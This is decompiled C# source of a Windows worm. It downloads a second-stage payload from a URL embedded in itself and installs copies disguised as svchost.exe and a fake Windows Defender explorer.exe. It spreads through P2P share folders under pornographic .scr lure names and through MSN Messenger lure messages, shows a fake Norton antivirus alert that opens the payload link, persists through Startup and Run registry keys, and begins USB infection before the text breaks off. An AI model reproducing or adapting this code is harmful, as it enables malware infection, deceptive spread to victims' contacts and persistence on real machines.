using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using MessengerAPI;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using stub.My;
using stub.My.Resources;

namespace stub;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("msn")]
	private Messenger _msn;

	private string fpath;

	private const string FileSplit = "@Infested@";

	private string[] options;

	private string link;

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	private virtual Messenger msn
	{
		get
		{
			return _msn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_msn = value;
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		fpath = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\svchost.exe";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		TextBox1 = new TextBox();
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(25, 12);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(242, 69);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(0);
		Timer1.set_Interval(6000);
		Timer3.set_Interval(4000);
		TextBox textBox = TextBox1;
		location = new Point(25, 86);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(241, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(303, 115);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).set_ForeColor(Color.Transparent);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern object GetWindowTextA();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA_1(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA_1(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Process.Start("C:\\Windows Defender\\explorer.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a8: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ba: Expected O, but got Unknown
		try
		{
			FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
			link = Strings.Space(checked((int)FileSystem.LOF(1)));
			FileSystem.FileGet(1, ref link, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			options = Strings.Split(link, "@Infested@", -1, (CompareMethod)0);
			TextBox1.set_Text(options[1]);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string text = TextBox1.get_Text();
		if (File.Exists(fpath))
		{
			try
			{
				File.Delete(fpath);
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text, fpath);
				Thread.Sleep(100);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Thread.Sleep(1);
				ProjectData.ClearProjectError();
			}
		}
		else
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text, fpath);
			Thread.Sleep(100);
		}
		try
		{
			if (Directory.Exists("C:\\Windows Defender"))
			{
				File.WriteAllBytes("C:\\Windows Defender\\Interop.MessengerPrivate.dll", Resources.Interop_MessengerPrivate);
				File.WriteAllBytes("C:\\Windows Defender\\Interop.MessengerAPI.dll", Resources.Interop_MessengerAPI);
				if (!File.Exists("C:\\Windows Defender\\explorer.exe"))
				{
					File.Copy(Application.get_ExecutablePath(), "C:\\Windows Defender\\explorer.exe");
				}
			}
			else
			{
				Directory.CreateDirectory("C:\\Windows Defender");
				File.WriteAllBytes("C:\\Windows Defender\\Interop.MessengerPrivate.dll", Resources.Interop_MessengerPrivate);
				File.WriteAllBytes("C:\\Windows Defender\\Interop.MessengerAPI.dll", Resources.Interop_MessengerAPI);
				File.Copy(Application.get_ExecutablePath(), "C:\\Windows Defender\\explorer.exe");
				Process.Start("C:\\Windows Defender\\explorer.exe");
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		lime();
		try
		{
			msn = (Messenger)new MessengerClass();
			IMessengerContacts val = (IMessengerContacts)((IMessenger4)msn).get_MyContacts();
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = val.GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					if (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Status", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(MISTATUS)1, false))
					{
						ListBox1.get_Items().Add(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "SigninName", new object[0], (string[])null, (Type[])null, (bool[])null)));
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		Timer1.Start();
		P2Pspread();
		share();
		Start();
		AregTime();
		USBInfect();
		string text2 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
		string text3 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
		Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
		string text4 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
		string text5 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
		string text6 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
		string text7 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
		Timer2.set_Interval(Conversions.ToInteger(text2 + text3 + text4 + text5 + text6 + text7));
		Timer2.Start();
		Timer3.Start();
		Mgr();
		Reg();
	}

	public void lime()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 1190:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0031;
						case 4:
							goto IL_005b;
						case 5:
							goto IL_0085;
						case 6:
							goto IL_00af;
						case 7:
							goto IL_00d9;
						case 9:
							goto IL_0108;
						case 10:
							goto IL_010b;
						case 11:
							goto IL_0132;
						case 12:
							goto IL_015d;
						case 13:
							goto IL_0188;
						case 14:
							goto IL_01b3;
						case 15:
							goto IL_01de;
						case 8:
						case 16:
						case 17:
							goto IL_0209;
						case 18:
							goto IL_0234;
						case 19:
							goto IL_025f;
						case 20:
							goto IL_028a;
						case 21:
							goto IL_02b5;
						case 22:
							goto IL_02e0;
						case 24:
							goto IL_0310;
						case 25:
							goto IL_0313;
						case 26:
							goto IL_033a;
						case 27:
							goto IL_0365;
						case 28:
							goto IL_0390;
						case 29:
							goto IL_03bb;
						case 30:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 23:
						case 31:
						case 32:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_03bb:
					num = 29;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\teen porn pics.avi.scr");
					break;
					IL_0007:
					num = 2;
					if (Directory.Exists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved"))
					{
						goto IL_0031;
					}
					goto IL_0108;
					IL_0031:
					num = 3;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\xxx.avi.scr");
					goto IL_005b;
					IL_005b:
					num = 4;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\porn.avi.scr");
					goto IL_0085;
					IL_0085:
					num = 5;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\teenage porn.avi.scr");
					goto IL_00af;
					IL_00af:
					num = 6;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\teen porn pics.avi.scr");
					goto IL_00d9;
					IL_00d9:
					num = 7;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\18 year old with dildo.avi.scr");
					goto IL_0209;
					IL_0108:
					num = 9;
					goto IL_010b;
					IL_010b:
					num = 10;
					Directory.CreateDirectory(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved");
					goto IL_0132;
					IL_0132:
					num = 11;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\xxx.avi.scr");
					goto IL_015d;
					IL_015d:
					num = 12;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\porn.avi.scr");
					goto IL_0188;
					IL_0188:
					num = 13;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\teenage porn.avi.scr");
					goto IL_01b3;
					IL_01b3:
					num = 14;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\teen porn pics.avi.scr");
					goto IL_01de;
					IL_01de:
					num = 15;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Saved\\18 year old with dildo.avi.scr");
					goto IL_0209;
					IL_0209:
					num = 17;
					if (Directory.Exists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared"))
					{
						goto IL_0234;
					}
					goto IL_0310;
					IL_0234:
					num = 18;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\xxx.avi.scr");
					goto IL_025f;
					IL_025f:
					num = 19;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\porn.avi.scr");
					goto IL_028a;
					IL_028a:
					num = 20;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\teenage porn.avi.scr");
					goto IL_02b5;
					IL_02b5:
					num = 21;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\teen porn pics.avi.scr");
					goto IL_02e0;
					IL_02e0:
					num = 22;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\18 year old with dildo.avi.scr");
					goto end_IL_0000_3;
					IL_0310:
					num = 24;
					goto IL_0313;
					IL_0313:
					num = 25;
					Directory.CreateDirectory(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared");
					goto IL_033a;
					IL_033a:
					num = 26;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\xxx.avi.scr");
					goto IL_0365;
					IL_0365:
					num = 27;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\porn.avi.scr");
					goto IL_0390;
					IL_0390:
					num = 28;
					File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\teenage porn.avi.scr");
					goto IL_03bb;
					end_IL_0000_2:
					break;
				}
				num = 30;
				File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\LimeWire\\Shared\\18 year old with dildo.avi.scr");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1190;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void P2Pspread()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "InstallDir", (object)0));
		string text2 = text + "\\Shared";
		try
		{
			File.Copy(Application.get_ExecutablePath(), text2 + "\\porn.scr");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programfiles\\Shared\\porn.scr"));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Shared"))
			{
				File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Shared\\porn.scr");
				File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Shared\\teen sex.scr");
				File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Shared\\paris hilton sex tape.scr");
				File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Shared\\sex tape xxx.scr");
				File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Shared\\porn.scr");
			}
			else
			{
				Directory.CreateDirectory(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Shared");
				File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Shared\\porn.scr");
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text3 = "C:\\Shared";
			if (Directory.Exists(text3))
			{
				File.Copy(Application.get_ExecutablePath(), text3);
				return;
			}
			Directory.CreateDirectory(text3);
			File.Copy(Application.get_ExecutablePath(), text3 + "\\porn.scr");
			File.Copy(Application.get_ExecutablePath(), text3 + "\\paris hilton sex tape.scr");
			File.Copy(Application.get_ExecutablePath(), text3 + "\\teen sex.scr");
			File.Copy(Application.get_ExecutablePath(), text3 + "\\secret sex tape.scr");
			File.Copy(Application.get_ExecutablePath(), text3 + "\\pussy climax orgasm fingering dildo sex xxx 18.scr");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		checked
		{
			try
			{
				string text = TextBox1.get_Text();
				string[] array = new string[11]
				{
					null,
					"lmao what a weekend http://TlNYCHAT.COM/chanb ",
					"webcam? :) http://TlNYCHAT.COM/chanb",
					"is this website up for you? http://TlNYCHAT.COM/chanb",
					"Can you take a look at this app I just made and maybe give me some feedback? " + text,
					":D haha http://TlNYCHAT.COM/chanb",
					"madness " + text,
					"who is this? " + text,
					"you know this guy?: " + text,
					"think this is any good? " + text,
					"... " + text
				};
				IMessengerContacts val = (IMessengerContacts)((IMessenger4)msn).get_MyContacts();
				VBMath.Randomize();
				try
				{
					string text2 = Conversions.ToString(ListBox1.get_Items().get_Item((int)Math.Round(VBMath.Rnd() * (float)ListBox1.get_Items().get_Count())));
					((IMessenger4)msn).InstantMessage((object)text2);
					Thread.Sleep(100);
					VBMath.Randomize();
					SendKeys.SendWait(array[(int)Math.Round(VBMath.Rnd() * (float)array.Count() - 1f)]);
					SendKeys.SendWait("{ENTER}");
					SendKeys.SendWait("{ESC}");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				ListBox1.get_Items().Clear();
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = val.GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						if (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Status", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(MISTATUS)1, false))
						{
							ListBox1.get_Items().Add(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "SigninName", new object[0], (string[])null, (Type[])null, (bool[])null)));
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Norton antivirus has detected a virus and needs to download a program to remove the infection.\r\n\r\nInternet explorer will now open and you will need install the program", (MsgBoxStyle)0, (object)"Norton Antivirus");
		Process.Start(TextBox1.get_Text());
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Start()
	{
		try
		{
			string fileName = Path.GetFileName(Application.get_ExecutablePath());
			string directoryRoot = Directory.GetDirectoryRoot(Environment.SystemDirectory);
			string path = directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\";
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			if (!directoryInfo.get_Exists())
			{
				if (File.Exists(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName))
				{
					FileSystem.Kill(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName);
				}
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName, true);
				FileSystem.SetAttr(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName, (FileAttribute)2);
				FileSystem.SetAttr(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName, (FileAttribute)1);
				FileSystem.SetAttr(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName, (FileAttribute)4);
			}
			else
			{
				if (File.Exists(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName))
				{
					FileSystem.Kill(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName);
				}
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName, true);
				FileSystem.SetAttr(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName, (FileAttribute)2);
				FileSystem.SetAttr(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName, (FileAttribute)1);
				FileSystem.SetAttr(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName, (FileAttribute)4);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void AregTime()
	{
		string fileName = Path.GetFileName(Application.get_ExecutablePath());
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\System\\Services\\";
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (!File.Exists(text + fileName))
			{
				FileSystem.FileCopy(Application.get_ExecutablePath(), text + fileName);
			}
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", ""));
			try
			{
				NewLateBinding.LateCall(objectValue, (Type)null, "regwrite", new object[2]
				{
					"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" + fileName,
					text + fileName
				}, (string[])null, (Type[])null, (bool[])null, true);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				NewLateBinding.LateCall(objectValue, (Type)null, "regwrite", new object[2]
				{
					"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" + fileName,
					text + fileName
				}, (string[])null, (Type[])null, (bool[])null, true);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void share()
	{
		string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Downloads\\eMule\\Incoming";
		string text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\bearshare\\shared";
		try
		{
			if (Directory.Exists(text))
			{
				File.Copy(Application.get_ExecutablePath(), text + "\\porn.scr");
				File.Copy(Application.get_ExecutablePath(), text + "\\paris hilton sex tape.scr");
				File.Copy(Application.get_ExecutablePath(), text + "\\teen sex.scr");
				File.Copy(Application.get_ExecutablePath(), text + "\\secret sex tape.scr");
				File.Copy(Application.get_ExecutablePath(), text + "\\pussy climax orgasm fingering dildo sex xxx 18.scr");
			}
			if (Directory.Exists(text2))
			{
				File.Copy(Application.get_ExecutablePath(), text2 + "\\porn.scr");
				File.Copy(Application.get_ExecutablePath(), text2 + "\\paris hilton sex tape.scr");
				File.Copy(Application.get_ExecutablePath(), text2 + "\\teen sex.scr");
				File.Copy(Application.get_ExecutablePath(), text2 + "\\secret sex tape.scr");
				File.Copy(Application.get_ExecutablePath(), text2 + "\\pussy climax orgasm fingering dildo sex xxx 18.scr");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void USBInfect()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string programFiles = default(string);
		string[] logicalDrives = default(string[]);
		string[] array = default(string[]);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 343:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0042;
						case 5:
							goto IL_004b;
						case 6:
							goto IL_0062;
						case 8:
							goto IL_0071;
						case 9:
							goto IL_0074;
						case 10:
							goto IL_0099;
						case 11:
							goto IL_00c9;
						case 12:
							goto IL_00de;
						case 14:
							goto IL_00f5;
						case 7:
						case 13:
							goto IL_00fe;
						default:
							goto end_IL_0000;
						case 15:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00fe:
					num5 = checked(num5 + 1);
					goto IL_00f5;
					IL_0008:
					num = 2;
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"0", RegistryValueKind.DWord);
					goto IL_002a;
					IL_002a:
					num = 3;
